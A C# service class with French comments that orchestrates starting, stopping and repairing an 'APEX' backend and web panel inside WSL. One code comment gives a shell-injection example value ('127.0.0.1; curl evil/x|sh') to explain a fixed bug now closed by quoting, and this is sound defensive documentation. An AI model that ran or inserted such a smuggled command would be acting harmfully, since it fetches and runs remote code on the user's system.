using ApexSetup.Dashboard.Models;

namespace ApexSetup.Dashboard.Services;

/// <summary>
/// Bornes réelles de l'orchestration — regroupées pour rester injectables
/// (voir <see cref="ApexOrchestrator"/>) sans changer le comportement de
/// production (<see cref="Default"/>) : les tests qui doivent observer un
/// timeout RÉEL (mission §20) le font en millisecondes, jamais en
/// attendant 90 secondes réelles pour un scénario négatif.
/// </summary>
public sealed record ApexOrchestratorTimings(
    TimeSpan CommandTimeout, TimeSpan PollInterval, TimeSpan ApiReadyTimeout, TimeSpan WebPanelReadyTimeout)
{
    public static ApexOrchestratorTimings Default { get; } = new(
        CommandTimeout: TimeSpan.FromSeconds(60), PollInterval: TimeSpan.FromSeconds(2),
        ApiReadyTimeout: TimeSpan.FromSeconds(90), WebPanelReadyTimeout: TimeSpan.FromSeconds(60));
}

public sealed class ApexOrchestrator(
    IProcessRunner processRunner,
    IWslProbe wslProbe,
    IRuntimeStatusService runtimeStatusService,
    IApiHealthChecker apiHealthChecker,
    IWebPanelChecker webPanelChecker,
    IBrowserLauncher browserLauncher,
    ILogSink log,
    ApexOrchestratorTimings? timings = null) : IApexOrchestrator
{
    private readonly ApexOrchestratorTimings _timings = timings ?? ApexOrchestratorTimings.Default;

    private ITrackedProcess? _backend;
    private ITrackedProcess? _frontend;

    public bool IsBackendTracked => _backend is { HasExited: false };
    public bool IsFrontendTracked => _frontend is { HasExited: false };

    public async Task<OrchestratorOutcome> StartAsync(DashboardSettings settings, CancellationToken cancellationToken = default)
    {
        // BUG RÉEL trouvé par revue de code (finalisation APEX.exe 1/2) :
        // rien n'empêchait un second appel à StartAsync (ex. l'utilisateur
        // reclique « LANCER APEX » après un premier succès) de lancer un
        // second wsl.exe et d'écraser silencieusement _backend/_frontend —
        // le premier processus suivi devenait un processus zombie, jamais
        // arrêté par StopAsync (qui ne connaît plus que le second). Voir
        // mission §7 « double lancement / processus zombie ».
        if (IsBackendTracked)
        {
            log.Log("APEX est déjà en cours d'exécution (processus suivi actif) — utilisez Arrêter puis Lancer pour redémarrer.");
            return OrchestratorOutcome.AlreadyRunning;
        }

        if (string.IsNullOrWhiteSpace(settings.ProjectPathWsl))
        {
            log.Log("Chemin du projet APEX non configuré — voir Paramètres.");
            return OrchestratorOutcome.ProjectNotConfigured;
        }

        log.Log("Vérification WSL...");
        var wslState = await wslProbe.ProbeAsync(settings.WslDistro, cancellationToken).ConfigureAwait(false);
        if (wslState.Status is ComponentStatus.NotInstalled or ComponentStatus.Error or ComponentStatus.Unknown)
        {
            log.Log($"WSL indisponible : {wslState.Detail}");
            return OrchestratorOutcome.WslUnavailable;
        }
        log.Log($"WSL OK ({wslState.Detail})");

        log.Log("Vérification du projet...");
        var projectFound = await wslProbe.PathExistsAsync(settings.WslDistro, settings.ProjectPathWsl, cancellationToken).ConfigureAwait(false);
        if (!projectFound)
        {
            log.Log($"Chemin du projet introuvable dans WSL : {settings.ProjectPathWsl}");
            return OrchestratorOutcome.ProjectPathNotFound;
        }
        log.Log("Projet APEX trouvé.");

        log.Log("Exécution de apex doctor (Docker/PostgreSQL/Redis/MinIO/Ollama/GPU)...");
        var components = await runtimeStatusService.GetComponentStatesAsync(cancellationToken).ConfigureAwait(false);
        foreach (var component in components)
        {
            log.Log($"  {component.Label}: {component.Status} — {component.Detail}");
        }

        log.Log("Démarrage d'APEX (scripts/apex-launch.sh serve, dans WSL)...");
        var backendArgs = WindowsWslProbe.BuildDistroArgs(settings.WslDistro);
        // BUG RÉEL trouvé par revue de code (validation physique N+31) :
        // `settings.ApiHost` est une valeur de configuration UTILISATEUR
        // (Paramètres, ou fichier settings.json potentiellement altéré) —
        // l'interpoler nue dans une commande `bash -lc` permettait une
        // injection shell (ex. ApiHost = "127.0.0.1; curl evil/x|sh")
        // d'exécuter des commandes arbitraires dans WSL. `settings.ApiPort`
        // est un `int` (jamais du texte libre, déjà sûr) mais quoté ici
        // aussi par défense en profondeur, sans coût. Même discipline que
        // `ShellCommand.CdAnd` pour le chemin projet — jamais une valeur
        // de configuration interpolée sans passer par `QuoteSingle`.
        backendArgs.AddRange([
            "--", "bash", "-lc",
            ShellCommand.CdAnd(
                settings.ProjectPathWsl,
                $"bash scripts/apex-launch.sh serve --host {ShellCommand.QuoteSingle(settings.ApiHost)} --port {ShellCommand.QuoteSingle(settings.ApiPort.ToString())}"),
        ]);
        _backend = processRunner.Start("wsl.exe", backendArgs);
        if (_backend is null)
        {
            log.Log("Échec du démarrage du processus WSL pour l'API — wsl.exe n'a pas pu être lancé.");
            return OrchestratorOutcome.BackendFailedToStart;
        }

        log.Log("Démarrage du Web Panel (npm run dev, dans WSL)...");
        var frontendArgs = WindowsWslProbe.BuildDistroArgs(settings.WslDistro);
        frontendArgs.AddRange([
            "--", "bash", "-lc",
            ShellCommand.CdAnd($"{settings.ProjectPathWsl}/frontend", $"npm run dev -- --port {settings.WebPanelPort} --host 127.0.0.1"),
        ]);
        _frontend = processRunner.Start("wsl.exe", frontendArgs);
        if (_frontend is null)
        {
            log.Log("Échec du démarrage du Web Panel — wsl.exe n'a pas pu être lancé.");
        }

        log.Log("Attente de la disponibilité réelle de l'API (vérification HTTP bornée, jamais un délai fixe)...");
        var apiReady = await PollUntilAsync(
            () => apiHealthChecker.CheckAsync(settings, cancellationToken),
            _timings.ApiReadyTimeout, () => _backend.HasExited, cancellationToken).ConfigureAwait(false);
        if (!apiReady)
        {
            if (_backend.HasExited)
            {
                log.Log($"L'API a quitté prématurément (code {_backend.ExitCode}) — voir les journaux WSL.");
                return OrchestratorOutcome.BackendCrashed;
            }
            log.Log($"L'API ne répond toujours pas après {_timings.ApiReadyTimeout.TotalSeconds:0}s.");
            return OrchestratorOutcome.TimedOutWaitingForApi;
        }
        log.Log($"API HTTP 200 — {settings.ApiBaseUrl}");

        log.Log("Attente de la disponibilité réelle du Web Panel...");
        var panelReady = await PollUntilAsync(
            () => webPanelChecker.CheckAsync(settings, cancellationToken), _timings.WebPanelReadyTimeout, () => false, cancellationToken)
            .ConfigureAwait(false);
        if (!panelReady)
        {
            log.Log($"Le Web Panel ne répond toujours pas après {_timings.WebPanelReadyTimeout.TotalSeconds:0}s — l'API reste disponible.");
            return OrchestratorOutcome.TimedOutWaitingForWebPanel;
        }
        log.Log($"Web Panel prêt — {settings.WebPanelUrl}");

        log.Log($"APEX READY — ouverture du navigateur ({settings.WebPanelUrl}).");
        // BUG RÉEL trouvé par revue de code (finalisation APEX.exe 1/2) :
        // le retour de IBrowserLauncher.Open (déjà un bool, prévu pour ça)
        // était ignoré — un navigateur non lancé (pas de navigateur par
        // défaut enregistré, association d'URL manquante, ...) ne
        // produisait AUCUNE trace : rien dans le journal, rien à l'écran,
        // alors que le Dashboard affichait "APEX READY". API et WebPanel
        // sont réellement prêts (Success reste correct), mais l'échec de
        // l'étape purement pratique "ouvrir le navigateur" doit rester
        // visible — voir mission §4/§9.
        if (!browserLauncher.Open(settings.WebPanelUrl))
        {
            log.Log($"Le navigateur n'a pas pu être ouvert automatiquement — ouvrez {settings.WebPanelUrl} manuellement.");
        }
        return OrchestratorOutcome.Success;
    }

    public async Task<OrchestratorOutcome> StopAsync(DashboardSettings settings, CancellationToken cancellationToken = default)
    {
        if (_backend is not null)
        {
            log.Log("Arrêt de l'API APEX (processus suivi)...");
            _backend.Kill();
            await _backend.DisposeAsync().ConfigureAwait(false);
            _backend = null;
        }

        if (_frontend is not null)
        {
            log.Log("Arrêt du Web Panel (processus suivi)...");
            _frontend.Kill();
            await _frontend.DisposeAsync().ConfigureAwait(false);
            _frontend = null;
        }

        if (string.IsNullOrWhiteSpace(settings.ProjectPathWsl))
        {
            return OrchestratorOutcome.Success;
        }

        log.Log("Arrêt de l'infrastructure Docker via scripts/apex-launch.sh stop (n'arrête que ce qui a été démarré par ce launcher)...");
        var args = WindowsWslProbe.BuildDistroArgs(settings.WslDistro);
        args.AddRange(["--", "bash", "-lc", ShellCommand.CdAnd(settings.ProjectPathWsl, "bash scripts/apex-launch.sh stop")]);
        var result = await processRunner.RunAsync("wsl.exe", args, _timings.CommandTimeout, cancellationToken).ConfigureAwait(false);
        if (!result.Started || result.TimedOut || result.ExitCode != 0)
        {
            log.Log($"scripts/apex-launch.sh stop a signalé un problème : {result.Stderr.Trim()}");
            return OrchestratorOutcome.StopFailed;
        }
        log.Log("Infrastructure arrêtée proprement.");
        return OrchestratorOutcome.Success;
    }

    public async Task<OrchestratorOutcome> RestartAsync(DashboardSettings settings, CancellationToken cancellationToken = default)
    {
        log.Log("Redémarrage d'APEX...");
        await StopAsync(settings, cancellationToken).ConfigureAwait(false);
        return await StartAsync(settings, cancellationToken).ConfigureAwait(false);
    }

    public async Task<OrchestratorOutcome> RepairAsync(DashboardSettings settings, CancellationToken cancellationToken = default)
    {
        if (string.IsNullOrWhiteSpace(settings.ProjectPathWsl))
        {
            return OrchestratorOutcome.ProjectNotConfigured;
        }

        // `apex start --dry-run` : exécute réellement doctor -> auto-repair
        // (apex.doctor.repair, SAFE_AUTO_FIX uniquement) -> gate, puis
        // s'arrête SANS démarrer le serveur (voir apex/cli/main.py::_cmd_start,
        // `if outcome.status is StartupStatus.DRY_RUN: return 0`) — jamais
        // une seconde logique de réparation inventée côté Dashboard, voir
        // mission §15 et apex/doctor/repair.py (auto-réparations déjà
        // prévues : ex. mot de passe Postgres désynchronisé).
        log.Log("Réparation — apex start --dry-run (doctor + auto-réparation sûre + gate, sans démarrer le serveur)...");
        var args = WindowsWslProbe.BuildDistroArgs(settings.WslDistro);
        args.AddRange(["--", "bash", "-lc", ShellCommand.CdAnd(settings.ProjectPathWsl, "apex start --dry-run")]);
        var result = await processRunner.RunAsync("wsl.exe", args, _timings.CommandTimeout, cancellationToken).ConfigureAwait(false);
        foreach (var line in result.Stdout.Split('\n', StringSplitOptions.RemoveEmptyEntries))
        {
            log.Log($"  {line.Trim()}");
        }

        if (!result.Started || result.TimedOut || result.ExitCode != 0)
        {
            log.Log($"Réparation incomplète : {result.Stderr.Trim()}");
            return OrchestratorOutcome.RepairFailed;
        }
        log.Log("Réparation terminée — environnement sain.");
        return OrchestratorOutcome.Success;
    }

    /// <summary>
    /// Interroge <paramref name="check"/> à intervalle régulier jusqu'à un
    /// état RÉEL positif ou l'expiration de <paramref name="timeout"/> —
    /// jamais un unique délai fixe suivi d'une supposition (mission §5 :
    /// « ne pas utiliser des délais fixes... utiliser des checks réels avec
    /// timeout »). S'arrête immédiatement si <paramref name="abort"/>
    /// devient vrai (ex. le processus suivi a déjà quitté — inutile
    /// d'attendre le timeout complet pour un crash déjà détecté).
    /// </summary>
    private async Task<bool> PollUntilAsync(
        Func<Task<ComponentState>> check, TimeSpan timeout, Func<bool> abort, CancellationToken cancellationToken)
    {
        var deadline = DateTimeOffset.UtcNow + timeout;
        while (DateTimeOffset.UtcNow < deadline)
        {
            if (abort())
            {
                return false;
            }
            var state = await check().ConfigureAwait(false);
            if (state.Status == ComponentStatus.Running)
            {
                return true;
            }
            cancellationToken.ThrowIfCancellationRequested();
            await Task.Delay(_timings.PollInterval, cancellationToken).ConfigureAwait(false);
        }
        return false;
    }
}
